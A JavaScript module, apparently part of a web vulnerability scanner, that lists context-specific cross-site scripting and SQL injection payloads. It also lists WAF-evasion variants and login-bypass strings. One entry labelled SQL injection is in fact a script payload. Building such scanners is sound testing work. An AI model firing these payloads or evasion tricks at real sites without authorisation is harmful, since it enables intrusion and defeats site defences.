// backend/src/engines/payloadEngine.js
// Context-aware payload selection engine with WAF evasion variants
import { CONTEXTS } from './contextAnalyzer.js';

const PAYLOAD_REGISTRY = {
    [CONTEXTS.HTML_BODY]: {
        xss: [
            '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>', '<details open ontoggle=alert(1)>',
            '<body onload=alert(1)>', '<marquee onstart=alert(1)>'
        ],
        sqli: ["<script>'+alert(1)+'</script>"]
    },
    [CONTEXTS.HTML_ATTRIBUTE]: {
        xss: [
            '" onmouseover="alert(1)', "' onfocus='alert(1)",
            '" autofocus onfocus="alert(1)', '" onload="alert(1)',
            "' onmouseover='alert(1)", '" style="background:url(javascript:alert(1))"'
        ]
    },
    [CONTEXTS.JS_STRING]: {
        xss: [
            "'; alert(1); //", "\\'; alert(1); //",
            "'-alert(1)-'", "\"; alert(1); //",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
        ]
    },
    [CONTEXTS.JS_TEMPLATE]: {
        xss: ["${alert(1)}", "${7*7}", "`; alert(1); //"]
    },
    [CONTEXTS.JSON_VALUE]: {
        xss: ['","x":"<script>alert(1)</script>'],
        sqli: ['","x":"1\' OR \'1\'=\'1']
    },
    [CONTEXTS.URL_PARAM]: {
        xss: ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
              'javascript:alert(document.domain)']
    },
    [CONTEXTS.CSS_VALUE]: {
        xss: ['expression(alert(1))', 'url(javascript:alert(1))']
    }
};

// WAF evasion payload variants
const EVASION_PAYLOADS = {
    xss: [
        '<ScRiPt>alert(1)</ScRiPt>',                    // Case variation
        '<scr<script>ipt>alert(1)</scr</script>ipt>',   // Nested tags
        '<img/src=x/onerror=alert(1)>',                  // Slash obfuscation
        '<svg/onload=alert(1)>',
        '<%00script>alert(1)</script>',                   // Null byte
        '<img src=x onerror=\\u0061lert(1)>',            // Unicode escape
        '<img src=x onerror=&#97;lert(1)>',              // HTML entity
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',// Base64
        '\"><img src=x onerror=alert(1)>',
        "';alert(String.fromCharCode(88,83,83))//",
    ],
    sqli: [
        "' /*!OR*/ '1'='1", "' %4fR '1'='1",           // Comment/encoding bypass
        "' /*!50000OR*/ '1'='1",                          // MySQL version-specific
        "'+OR+'1'='1", "' || '1'='1",                    // Alternate operators
        "admin'/**/--", "admin'%23",                      // Comment variants
        "'%20OR%20'1'%3D'1", "' oR '1'='1",             // URL encoding + case
    ]
};

/**
 * Get appropriate payloads for a given context and test type
 * @param {string} context - Reflection context from contextAnalyzer
 * @param {string} testType - 'xss', 'sqli'
 * @param {object} options - { wafEvasion: boolean }
 * @returns {string[]} Array of payloads
 */
export function getPayloads(context, testType, options = {}) {
    const contextPayloads = PAYLOAD_REGISTRY[context]?.[testType] || [];
    const genericPayloads = PAYLOAD_REGISTRY[CONTEXTS.HTML_BODY]?.[testType] || [];
    let payloads = [...contextPayloads, ...genericPayloads];

    // Add evasion payloads if WAF detected and opt-in enabled
    if (options.wafEvasion && EVASION_PAYLOADS[testType]) {
        payloads = [...payloads, ...EVASION_PAYLOADS[testType]];
    }

    return [...new Set(payloads)]; // Deduplicate
}

/**
 * Get all payload categories for reporting
 */
export function getPayloadInfo() {
    return {
        contexts: Object.keys(PAYLOAD_REGISTRY),
        testTypes: ['xss', 'sqli'],
        evasionTypes: Object.keys(EVASION_PAYLOADS)
    };
}

export default { getPayloads, getPayloadInfo, PAYLOAD_REGISTRY, EVASION_PAYLOADS };
